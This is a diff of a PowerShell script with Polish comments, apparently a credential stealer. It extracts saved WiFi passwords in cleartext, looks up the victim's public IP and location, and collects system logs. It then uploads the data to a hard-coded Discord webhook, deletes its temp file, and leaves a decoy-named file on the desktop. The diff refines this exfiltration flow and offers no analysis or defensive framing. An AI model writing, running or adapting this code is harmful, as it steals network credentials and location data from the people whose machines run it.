@@ -1,7 +1,7 @@
 $n = "$env:TEMP\$env:UserName.txt"
 $w = 'https://discord.com/api/webhooks/1361318439314128928/0ysFUO-d6BMEU4T7fQmlHVCAU2lK8-3gr-HgTDMOwu3QZ1ikm1_k9t9LAPMLM1IBg--z'
 
-# 1. WiFi Hasła
+# 1. WiFi hasła
 $wifi = (netsh wlan show profiles) | Select-String ':(.+)$' | ForEach-Object {
     $p = $_.Matches.Groups[1].Value.Trim()
     (netsh wlan show profile name="$p" key=clear) |
@@ -12,7 +12,7 @@ $wifi = (netsh wlan show profiles) | Select-String ':(.+)$' | ForEach-Object {
     }
 }
 
-# 2. Publiczne IP + lokalizacja
+# 2. IP i lokalizacja
 try {
     $ipinfo = Invoke-RestMethod -Uri "https://ipinfo.io/json" -UseBasicParsing
     $ipText = @"
@@ -41,7 +41,7 @@ try {
     $logs = "Brak dostępu do logów systemowych"
 }
 
-# 5. Zapis wszystkiego do pliku
+# 5. Złożenie wszystkich danych
 $all = @()
 $all += "=== WIFI HASŁA ==="
 $all += $wifi
@@ -55,7 +55,15 @@ $all += $logs
 $all | Set-Content $n
 Start-Sleep -Milliseconds 500
 
-# 6. Wysyłka do webhooka
+# 6. Utwórz plik na pulpicie
+try {
+    $desktop = [Environment]::GetFolderPath("Desktop")
+    Set-Content -Path "$desktop\Paweł_Zbieć_Morfologia.txt" -Value " " -Force
+} catch {
+    "$($_.Exception.Message)" | Out-File "$env:TEMP\blad_pulpitu.txt"
+}
+
+# 7. Wysyłka do Discord webhook
 $bd = [guid]::NewGuid().ToString()
 $lf = "`r`n"
 $h = @{ 'Content-Type' = "multipart/form-data; boundary=$bd" }
@@ -71,7 +79,6 @@ $b = @(
 
 $d = [System.Text.Encoding]::UTF8.GetBytes($b)
 Invoke-RestMethod -Uri $w -Method POST -Headers $h -Body $d
+
+# 8. Sprzątanie
 Remove-Item $n -Force
-# 7. Utworzenie pliku na pulpicie (pewna metoda)
-$desktop = [Environment]::GetFolderPath("Desktop")
-New-Item -Path "$desktop\Paweł_Zbieć_Morfologia.txt" -ItemType File -Force | Out-Null
